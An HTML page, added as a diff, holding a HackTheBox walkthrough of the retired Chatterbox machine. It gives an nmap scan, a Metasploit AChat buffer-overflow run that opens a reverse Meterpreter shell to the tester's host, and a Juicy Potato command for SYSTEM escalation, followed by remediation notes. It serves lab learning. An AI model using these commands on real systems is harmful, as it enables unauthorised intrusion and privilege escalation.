@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>HTB Chatterbox: AChat overflow and Juicy Potato to SYSTEM — Lucky Thandel</title>
+<meta name="description" content="A chat server with a classic buffer overflow plus SeImpersonatePrivilege: the exact recipe Juicy Potato was made for. By Lucky Thandel.">
+<link rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div class="wrap">
+<nav class="nav">
+  <a class="logo" href="../../">lucky@thandel:~<span class="cursor">▊</span></a>
+  <a class="link" href="../../">./home</a>
+  <a class="link active" href="../">./articles</a>
+  <a class="link" href="../../about/">./about</a>
+  <a class="link" href="../../contact/">./contact</a>
+</nav>
+
+<div class="meta">2026-10-12 · retired-machine · by Lucky Thandel</div>
+<h1>HTB Chatterbox: AChat overflow and Juicy Potato to SYSTEM</h1>
+<div><span class="tag">retired-machine</span><span class="tag">easy</span></div>
+
+<div class="article-body">
+<p>Chatterbox is a retired HackTheBox easy Windows machine pairing two textbook techniques. Synopsis: an AChat buffer overflow for foothold plus SeImpersonatePrivilege — the exact recipe Juicy Potato was made for.</p>
+<h2><span class="amber">$</span> Enumeration — Nmap, all ports</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># nmap: full sweep for odd services</span>
+nmap -sC -sV -p- -oN chatterbox.nmap 10.10.10.74</pre>
+<p>An unusual high port runs AChat 0.150 beta7 — a small chat server — beside standard Windows ports. Niche network services with old versions are always worth fingerprinting twice.</p>
+<h2><span class="amber">$</span> Foothold — AChat overflow</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># msfconsole: achat_bof</span>
+msfconsole -q
+msf6 &gt; use exploit/windows/misc/achat_bof
+msf6 exploit(achat_bof) &gt; set RHOSTS 10.10.10.74
+msf6 exploit(achat_bof) &gt; set LHOST 10.10.14.23
+msf6 exploit(achat_bof) &gt; run
+[*] Meterpreter session 1 opened as ALFRED\Alfred</pre>
+<p>AChat 0.150 beta7 has a public stack overflow in username handling. The module returns a shell as the low-privilege Alfred user.</p>
+<h2><span class="amber">$</span> Privilege escalation — Juicy Potato</h2>
+<pre class="terminal"><span class="prompt"></span><span class="code-title"># meterpreter: check privs, run potato</span>
+meterpreter &gt; getprivs   # SeImpersonatePrivilege present
+# upload JuicyPotato.exe, then:
+meterpreter &gt; execute -f JuicyPotato.exe -a &quot;-l 1337 -p c:\windows\system32\cmd.exe -a \&quot;/c whoami\&quot; -t * -c {CLSID}&quot;</pre>
+<p>SeImpersonatePrivilege lets Juicy Potato clone a SYSTEM token into your shell (pick a working CLSID for the OS build). Service accounts with impersonation rights are standing SYSTEM-equivalents. Flag values redacted per HTB rules; earn them in your own lab.</p>
+<h2><span class="amber">$</span> Dead ends</h2>
+<p>Fuzzing HTTP first (the chat port is the attack surface — scan all 65k and read every banner) and kernel exploits before checking privileges (whoami /priv takes five seconds and names the potato path).</p>
+<h2><span class="amber">$</span> Remediation notes</h2>
+<p>Retire abandonware network services, strip SeImpersonatePrivilege where unneeded, and monitor for potato indicators. Written by Lucky Thandel.</p>
+</div>
+
+<div class="byline">Written by <strong>Lucky Thandel</strong> · HTB walkthrough series · retired machines only — no spoilers for active boxes.</div>
+<p><a class="btn" href="../">← $ cd ../articles</a></p>
+
+<footer>
+  <span>© 2026 Lucky Thandel · written by Lucky Thandel</span>
+  <span>session <span id="session-clock">00:00:00</span> · <a href="../../contact/">contact</a></span>
+</footer>
+</div>
+<script src="../../assets/js/terminal.js"></script>
+</body>
+</html>
